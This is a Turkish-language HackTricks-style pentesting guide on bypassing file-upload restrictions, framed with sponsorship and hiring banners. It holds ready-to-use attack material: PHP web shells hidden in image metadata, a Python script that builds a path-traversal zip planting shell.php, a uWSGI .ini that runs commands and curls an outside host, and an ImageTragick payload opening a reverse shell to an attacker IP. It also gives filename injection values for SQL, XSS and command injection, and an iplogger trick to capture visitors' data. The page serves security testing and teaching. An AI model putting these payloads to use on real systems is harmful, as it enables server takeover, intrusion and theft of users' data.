# Dosya Yükleme

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin!</summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Discord** 💬 [**grubumuza katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek paylaşın.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Eğer **hacking kariyeri**ne ilgi duyuyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı şekilde Lehçe yazılı ve konuşulması gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

## Dosya Yükleme Genel Metodolojisi

Diğer kullanışlı uzantılar:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8'de Çalışma**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Sunucusu**: _.yaws_

### Dosya uzantıları kontrolünü atlatma

1. Eğer varsa, **önceki uzantıları kontrol edin.** Ayrıca onları bazı **büyük harflerle** deneyin: _pHp, .pHP5, .PhAr ..._
2. _Çalıştırma uzantısından önce **geçerli bir uzantı ekleyin** (önceki uzantıları da kullanın):_
* _file.png.php_
* _file.png.Php5_
3. **Sonuna özel karakterler eklemeyi deneyin.** Burp'u kullanarak tüm **ascii** ve **Unicode** karakterlerini **bruteforce** etmeyi deneyebilirsiniz. (_Not: Ayrıca **önceki** bahsedilen **uzantıları** da deneyebilirsiniz_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Sunucu tarafındaki uzantı ayrıştırıcısını **yanıltarak korumaları atlamayı deneyin**. **Uzantıyı ikiye katlama** veya **uzantılar arasına gereksiz veri** (**null** baytları) eklemek gibi tekniklerle. _Daha iyi bir payload hazırlamak için **önceki uzantıları** da kullanabilirsiniz._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Önceki kontrolde **başka bir katman uzantı ekleyin**:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **Geçerli uzantıdan önce exec uzantısını ekleyin** ve sunucunun yanlış yapılandırılmış olmasını umun. (Apache yan yapılandırmalarını sömürmek için faydalıdır, burada uzantısı **.php** olan her şey, ancak **mutlaka** .php ile bitmeyen her şey kodu çalıştıracaktır):
* _örn: file.php.png_
7. **Windows'ta NTFS alternatif veri akışını (ADS)** kullanın. Bu durumda, yasaklı bir uzantıdan önce ve izin verilen bir uzantıdan sonra iki nokta karakteri “:” eklenir. Sonuç olarak, sunucuda yasaklı uzantılı **boş bir dosya** oluşturulur (örn. “file.asax:.jpg”). Bu dosya daha sonra kısa dosya adını kullanarak düzenlenebilir. “**::$data**” deseni ayrıca boş olmayan dosyalar oluşturmak için kullanılabilir. Bu nedenle, bu desenin ardından bir nokta karakteri eklemek, daha fazla kısıtlamayı atlamak için de yararlı olabilir (örn. “file.asp::$data.”)
8. Dosya adı sınırlarını aşmayı deneyin. Geçerli uzantı kesilir ve kötü niyetli PHP bırakılır. AAA<--SNIP-->AAA.php

```
# Linux maksimum 255 bayt
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # burada 4 eksiltin ve .png ekleyin
# Dosyayı yükleyin ve kaç karakter izin verdiğini kontrol edin. Diyelim ki 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Payload'ı oluşturun
AAA<--SNIP 232 A-->AAA.php.png
```
### İçerik Türü, Sihirli Sayı, Sıkıştırma ve Yeniden Boyutlandırma Engelleme

* **Content-Type** kontrollerini atlayarak **Content-Type** **başlığının değerini** şu şekilde ayarlayın: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **Sihirli sayı** kontrolünü atlayarak dosyanın başına **gerçek bir resmin baytlarını** ekleyerek (_file_ komutunu karıştırın). Veya **metadata** içine **shell** ekleyin:\
`exiftool -Comment="<?php echo 'Komut:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya ayrıca bir resme **doğrudan payload ekleyebilirsiniz**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Eğer resminize **sıkıştırma ekleniyorsa**, örneğin [PHP-GD](https://www.php.net/manual/fr/book.image.php) gibi bazı standart PHP kütüphanelerini kullanarak, önceki teknikler işe yaramayabilir. Ancak, sıkıştırmayı **hayatta kalacak metin** eklemek için **PLTE chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanabilirsiniz.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Web sayfası ayrıca resmi **yeniden boyutlandırarak** kullanıyor olabilir, örneğin PHP-GD fonksiyonları `imagecopyresized` veya `imagecopyresampled` kullanarak. Ancak, sıkıştırmayı **hayatta kalacak metin** eklemek için **IDAT chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanabilirsiniz.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Bir başka teknik, bir payload oluşturmak için **resmi yeniden boyutlandırma** işleminden sonra hayatta kalacak metin eklemek için PHP-GD fonksiyonu `thumbnailImage` kullanmaktır. Ancak, sıkıştırmayı **hayatta kalacak metin** eklemek için **tEXt chunk** [**burada tanımlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanabilirsiniz.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Diğer İpuçları

* Zaten yüklenmiş olan dosyayı **yeniden adlandırmak** için bir zafiyet bulun.
* Geri kapıyı çalıştırmak için **Yerel Dosya Dahil Etme** zafiyeti bul.
* **Olası Bilgi Sızıntısı**:
1. **Aynı dosyayı** ve **aynı ismi** **birkaç kez** (ve **aynı anda**) yükleyin
2. Zaten var olan bir **dosya** veya **dizin** adıyla bir dosya yükleyin
3. İsmini **“.”, “..”, veya “…”** olarak belirtilen bir dosya yükleyin. Örneğin, Apache'de **Windows**'ta, uygulama yüklenen dosyaları “/www/uploads/” dizininde saklıyorsa, “.” dosya adı “/www/” dizininde “uploads” adında bir dosya oluşturacaktır.
4. **NTFS**'de **“…:.jpg”** gibi kolayca silinmeyen bir dosya yükleyin. (Windows)
5. İsminde `|<>*?”` gibi **geçersiz karakterler** bulunan bir dosya yükleyin. (Windows)
6. **Yasaklanmış** (**yasaklanmış**) **isimler** kullanarak bir dosya yükleyin, örneğin CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ve LPT9.
* Ayrıca yanlışlıkla açıldığında kodu **çalıştıracak bir** (.exe) veya **.html** (daha az şüpheli) dosya yüklemeyi deneyin.

### Özel Uzantı İpuçları

Eğer dosyaları bir **PHP sunucusuna** yüklemeye çalışıyorsanız, [kodun **çalıştırılmasını sağlamak için** **.htaccess** hilesine bakın](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Eğer dosyaları bir **ASP sunucusuna** yüklemeye çalışıyorsanız, [kodun **çalıştırılmasını sağlamak için** **.config** hilesine bakın](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyaları java için `.jar` gibi, ancak php için ve bir php dosyası gibi **kullanılabilir** (php ile çalıştırılarak veya bir betik içine dahil edilerek...)

`.inc` uzantısı bazen yalnızca dosyaları **ithal etmek** için kullanılan php dosyaları için kullanılır, bu nedenle, bir noktada, birinin **bu uzantının çalıştırılmasına izin vermiş olabileceğini** düşünebilirsiniz.

## **Jetty RCE**

Eğer bir XML dosyasını Jetty sunucusuna yükleyebilirseniz, [RCE elde edebilirsiniz çünkü **yeni \*.xml ve \*.war otomatik olarak işlenir**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Bu nedenle, aşağıdaki resimde belirtildiği gibi, XML dosyasını `$JETTY_BASE/webapps/` dizinine yükleyin ve kabuk bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Bu zafiyetin detaylı keşfi için orijinal araştırmaya göz atın: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

UWSGI sunucularında Uzaktan Komut Yürütme (RCE) zafiyetleri, `.ini` yapılandırma dosyasını değiştirme yeteneğine sahip olanlar tarafından sömürülebilir. UWSGI yapılandırma dosyaları, "sihirli" değişkenleri, yer tutucuları ve operatörleri içeren belirli bir sözdizim kullanır. Özellikle, `@(filename)` olarak kullanılan '@' operatörü, bir dosyanın içeriğini dahil etmek için tasarlanmıştır. UWSGI'de desteklenen çeşitli şemalardan biri olan "exec" şeması özellikle güçlüdür, bir işlemin standart çıktısından veri okumayı sağlar. Bu özellik, bir `.ini` yapılandırma dosyası işlendiğinde Uzaktan Komut Yürütme veya Keyfi Dosya Yazma/Okuma gibi kötü amaçlar için manipüle edilebilir.

Aşağıdaki zararlı `uwsgi.ini` dosyası örneğini düşünün, çeşitli şemaları göstermektedir:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'ın yürütülmesi, yapılandırma dosyasının ayrıştırılması sırasında gerçekleşir. Yapılandırmanın etkinleştirilmesi ve ayrıştırılması için uWSGI işlemi ya yeniden başlatılmalıdır (potansiyel olarak bir çökme sonrası veya Bir Hizmet Reddi saldırısından dolayı) ya da dosya otomatik yeniden yükleme olarak ayarlanmalıdır. Etkinleştirilmişse, otomatik yeniden yükleme özelliği, değişiklikler algılandığında belirtilen aralıklarda dosyayı yeniden yükler.

uWSGI'nin yapılandırma dosyası ayrıştırmasının gevşek doğasını anlamak son derece önemlidir. Özellikle, tartışılan payload, bir ikili dosyaya (örneğin bir resim veya PDF) yerleştirilebilir, potansiyel sömürü alanını daha da genişletir.

## **wget Dosya Yükleme/SSRF Hilesi**

Bazı durumlarda, bir sunucunun **`wget`** kullanarak **dosyaları indirdiğini** ve **URL**'yi **belirtebileceğinizi** fark edebilirsiniz. Bu durumlarda, kodun indirilen dosyaların uzantısının bir beyaz listeye dahil olduğunu kontrol edebileceğini ve yalnızca izin verilen dosyaların indirileceğini sağlamak için. Ancak, **bu kontrol atlatılabilir.**\
**Linux**'taki bir **dosya adının** maksimum uzunluğu **255** karakterdir, ancak **wget** dosya adlarını **236** karaktere kısaltır. **"A"\*232+".php"+".gif"** adında bir dosya indirebilirsiniz, bu dosya adı **kontrolü atlayacaktır** (bu örnekte **".gif"** geçerli bir uzantıdır) ancak `wget` dosyayı **"A"\*232+".php"** olarak yeniden adlandıracaktır.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
**Başka bir seçenek** olarak düşünebileceğiniz şey, bu kontrolü atlatmanın bir yolu olarak **HTTP sunucusunu farklı bir dosyaya yönlendirmesini sağlamaktır**, böylece başlangıçtaki URL, wget o zaman yönlendirilen dosyayı yeni adıyla indireceği için kontrolü atlatır. Bu, wget'in `--trust-server-names` **parametresiyle kullanılmadığı sürece çalışmayacaktır**, çünkü **wget yönlendirilen sayfayı orijinal URL'de belirtilen dosya adıyla indirecektir**.

## Araçlar

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass), Pentesterlara ve Hata Avcılarına dosya yükleme mekanizmalarını test etmede yardımcı olmak için tasarlanmış güçlü bir araçtır. Çeşitli hata avı tekniklerinden yararlanarak web uygulamalarının kapsamlı değerlendirmelerini sağlayarak zayıflıkları belirleme ve sömürme sürecini basitleştirir.

## Dosya yüklemeden diğer zayıflıklara

* **Dosya adını** `../../../tmp/lol.png` olarak ayarlayın ve bir **yol geçişi** elde etmeye çalışın
* **Dosya adını** `sleep(10)-- -.jpg` olarak ayarlayın ve bir **SQL enjeksiyonu** elde etme olasılığınız olabilir
* **Dosya adını** `<svg onload=alert(document.domain)>` olarak ayarlayarak bir XSS elde edin
* **Dosya adını** `; sleep 10;` olarak ayarlayarak bazı komut enjeksiyonlarını test edin (daha fazla [komut enjeksiyonu hilesi burada](../command-injection.md))
* [**Resim (svg) dosyasında XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** dosyası **yükleme** + **XSS** = [**Service Workers** kötüye kullanımı](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**SVG yüklemede XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [SVG dosyası yükleyerek **Açık Yönlendirme**](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) adresinden **farklı svg payloadları** deneyin
* Ünlü **ImageTrick** zayıflığı
* Web sunucusunu bir URL'den bir resmi yakalamaya işaret edebilirseniz, bir [SSRF'yi](../ssrf-server-side-request-forgery/) kötüye kullanmaya çalışabilirsiniz. Bu **resim**in bazı **genel** bir siteye **kaydedilecek** olması durumunda, [https://iplogger.org/invisible/](https://iplogger.org/invisible/) adresinden bir URL belirtebilir ve her ziyaretçinin bilgilerini **çalabilirsiniz**.
* [PDF-Adobe yükleme ile **XXE ve CORS** atlatma](pdf-upload-xxe-and-cors-bypass.md)
* XSS için özel olarak oluşturulmuş PDF'ler: [Aşağıdaki sayfa, JS yürütme elde etmek için PDF verilerini nasıl enjekte edeceğinizi](../xss-cross-site-scripting/pdf-injection.md) göstermektedir. PDF'ler yükleyebiliyorsanız, verilen talimatları takip ederek keyfi JS yürütebilecek bir PDF hazırlayabilirsiniz.
* Sunucunun herhangi bir **antivirüs** programına sahip olup olmadığını kontrol etmek için \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) içeriğini yükleyin
* Dosya yükleme sırasında herhangi bir **boyut sınırı** olup olmadığını kontrol edin

İşte yükleme yaparak elde edebileceğiniz şeylerin en iyi 10 listesi ([buradan](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Depolanmış XSS / SSRF / XXE
3. **GIF**: Depolanmış XSS / SSRF
4. **CSV**: CSV enjeksiyonu
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML enjeksiyonu / XSS / Açık yönlendirme
8. **PNG / JPEG**: Piksel seli saldırısı (DoS)
9. **ZIP**: LFI aracılığıyla RCE / DoS
10. **PDF / PPTX**: SSRF / Kör XXE

#### Burp Eklentisi

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Sihirli Başlık Baytları

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Diğer dosya türleri için [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) adresine başvurun.

### Zip/Tar Dosyası Otomatik Olarak Sıkıştırılmış Yükleme

Sunucu içinde sıkıştırılacak bir ZIP yükleyebiliyorsanız, 2 şey yapabilirsiniz:

#### Sembolik bağ

Diğer dosyalara yumuşak bağlantılar içeren bir bağlantı yükleyin, ardından, sıkıştırılmış dosyalara erişerek bağlı dosyalara erişeceksiniz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Farklı klasörlerde açma

Sıkıştırma sırasında dosyaların beklenmedik bir şekilde dizinlerde oluşturulması ciddi bir sorundur. İlk başta bu yapılandırmanın kötü niyetli dosya yüklemeleri aracılığıyla OS düzeyinde komut yürütme karşısında koruma sağlayabileceği varsayılsa da, ZIP arşiv formatının hiyerarşik sıkıştırma desteği ve dizin geçişi yetenekleri istismar edilebilir. Bu, saldırganların hedef uygulamanın açma işlevselliğini manipüle ederek kısıtlamaları atlamasına ve güvenli yükleme dizinlerinden kaçmasına olanak tanır.

Bu tür dosyaları oluşturmak için otomatik bir saldırı aracı [**GitHub'daki evilarc**](https://github.com/ptoomey3/evilarc) adresinde mevcuttur. Yardımcı program şu şekilde kullanılabilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Ek olarak, **evilarc ile symlink hilesi** bir seçenektir. Eğer `/flag.txt` gibi bir dosyayı hedef almak amaçlanıyorsa, o dosyaya bir symlink oluşturulmalıdır. Bu, evilarc'ın işlemi sırasında hata ile karşılaşmamasını sağlar.

Aşağıda, kötü niyetli bir zip dosyası oluşturmak için kullanılan Python kodu örneği bulunmaktadır:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Dosya sıkıştırma kötüye kullanımı için dosya püskürtme**

Daha fazla ayrıntı için **orijinal yazıya bakın**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1. **Bir PHP Shell Oluşturma**: PHP kodu, `$_REQUEST` değişkeninden geçirilen komutları çalıştırmak için yazılmıştır.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. **Dosya Püskürtme ve Sıkıştırılmış Dosya Oluşturma**: Birden fazla dosya oluşturulur ve bu dosyaları içeren bir zip arşivi oluşturulur.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3. **Hex Düzenleyici veya vi ile Değiştirme**: Zip içindeki dosyaların adları, "xxA"yı değiştirerek dizinleri gezmek için vi veya bir hex düzenleyici kullanılarak değiştirilir.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Bu içeriği bir resim uzantısıyla yükleyerek zafiyeti sömürün **(ImageMagick, 7.0.1-1)** (exploit için [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## PNG İçine PHP Shell Gömme

Bir PNG dosyasının IDAT parçasına bir PHP shell gömmek, belirli görüntü işleme işlemlerini etkili bir şekilde atlayabilir. PHP-GD'den `imagecopyresized` ve `imagecopyresampled` işlevleri bu bağlamda özellikle önemlidir, çünkü genellikle görüntüleri yeniden boyutlandırma ve örnekleme işlemleri için kullanılırlar. Gömülü PHP shell'in bu işlemlerden etkilenmemesi, belirli kullanım durumları için önemli bir avantajdır.

Bu tekniğin ayrıntılı keşfi, metodolojisi ve potansiyel uygulamaları aşağıdaki makalede sunulmaktadır: ["PNG IDAT Parçalarında Web Shell Kodlama"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak, işlemin ve sonuçlarının kapsamlı bir anlayışını sunmaktadır.

Daha fazla bilgi için: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Poliglot Dosyalar

Poliglot dosyalar, siber güvenlikte benzersiz bir araç olarak hizmet eder, aynı anda birden fazla dosya biçiminde geçerli olabilen kameleonlar olarak işlev görür. İlginç bir örnek [GIFAR](https://en.wikipedia.org/wiki/Gifar) adlı bir hibriddir, hem bir GIF hem de bir RAR arşivi olarak işlev görür. Bu tür dosyalar sadece bu eşleşmeyle sınırlı değildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mümkündür.

Poliglot dosyaların temel faydası, dosyaları türlerine göre tarayan güvenlik önlemlerini atlatma kapasitelerindedir. Çeşitli uygulamalarda yaygın olan bir uygulama, yalnızca belirli dosya türlerine izin vermek -örneğin JPEG, GIF veya DOC- potansiyel olarak zararlı biçimlerin (örneğin JS, PHP veya Phar dosyaları) oluşturabileceği riski azaltmak içindir. Ancak, poliglot dosyalar, birden fazla dosya türünün yapısal kriterlerine uyarak bu kısıtlamaları gizlice atlayabilir.

Uyum sağlama yeteneklerine rağmen, poliglotlar bazı sınırlamalarla karşılaşabilir. Örneğin, bir poliglot aynı anda bir PHAR dosyasını (PHp ARşiv) ve bir JPEG dosyasını temsil edebilirken, yüklemenin başarısı platformun dosya uzantısı politikalarına bağlı olabilir. Sistem, izin verilen uzantılar konusunda katıysa, bir poliglotun yalnızca yapısal ikili yapısı, yüklemenin garantisi olmayabilir.

Daha fazla bilgi için: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## Referanslar

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Eğer **hacking kariyeri**ne ilgi duyuyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı Polonyaca yazma ve konuşma gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Sıfırdan Kahraman'a AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keşfedin**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek destek olun.**

</details>
